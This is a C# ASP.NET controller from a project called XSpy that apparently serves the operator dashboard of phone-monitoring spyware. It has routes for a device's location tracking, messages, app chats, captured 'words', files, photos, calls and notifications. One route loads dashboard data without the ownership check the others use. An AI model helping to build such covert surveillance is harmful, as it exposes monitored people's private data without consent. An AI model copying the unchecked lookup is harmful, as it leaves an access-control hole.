using System;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using XSpy.Controllers.Base;
using XSpy.Database.Services;
using XSpy.Shared.Models;
using XSpy.Shared.Models.Views;
using XSpy.Shared.Models.Views.Device;
using XSpy.Utils;

namespace XSpy.Controllers
{
    public class DeviceController : BaseController
    {
        private DeviceService _deviceService;

        public DeviceController(DeviceService deviceService)
        {
            _deviceService = deviceService;
        }

        [Route("{deviceId}/dashboard"), PreExecution]
        public async Task<IActionResult> MenuView(Guid deviceId)
        {
            var data = await _deviceService.GetDashboardInfo(deviceId);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(data);
        }

        [Route("{deviceId}/details"), PreExecution]
        public async Task<IActionResult> Details(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new DeviceDataViewModel
            {
                Device = data
            });
        }

        [Route("{deviceId}/tracking"), PreExecution]
        public async Task<IActionResult> Tracking(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");


            var latestLoc = await _deviceService.GetLatestLocation(deviceId);
            return View(new LocationDataViewModel
            {
                Device = data,
                LatestLocation = latestLoc
            });
        }

        [Route("{deviceId}/messages"), PreExecution]
        public async Task<IActionResult> Messages(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new LocationDataViewModel
            {
                Device = data
            });
        }


        [Route("{deviceId}/appMessages/{appType}"), PreExecution]
        public async Task<IActionResult> AppMessages(Guid deviceId, AppType appType)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            var contacts = await _deviceService.GetAppContacts(data, appType);

            return View(new DeviceAppMessagesViewModel()
            {
                DeviceId = deviceId,
                Contacts = contacts
            });
        }

        [Route("{deviceId}/words"), PreExecution]
        public async Task<IActionResult> Words(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new LocationDataViewModel
            {
                Device = data
            });
        }

        [Route("{deviceId}/files"), PreExecution]
        public async Task<IActionResult> Files(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new LocationDataViewModel
            {
                Device = data
            });
        }

        [Route("{deviceId}/downloads"), PreExecution]
        public async Task<IActionResult> Downloads(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new LocationDataViewModel
            {
                Device = data
            });
        }

        [Route("{deviceId}/photos"), PreExecution]
        public async Task<IActionResult> Photos(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new DeviceDataViewModel
            {
                Device = data
            });
        }

        [Route("{deviceId}/phone"), PreExecution]
        public async Task<IActionResult> Phone(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new DeviceDataViewModel
            {
                Device = data
            });
        }

        [Route("{deviceId}/notifications"), PreExecution]
        public async Task<IActionResult> Notifications(Guid deviceId)
        {
            var data = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (data == null)
                return RedirectToActionPermanent("List");

            return View(new DeviceDataViewModel
            {
                Device = data
            });
        }

        [Route("list"), PreExecution]
        public IActionResult List()
        {
            return View();
        }
    }
}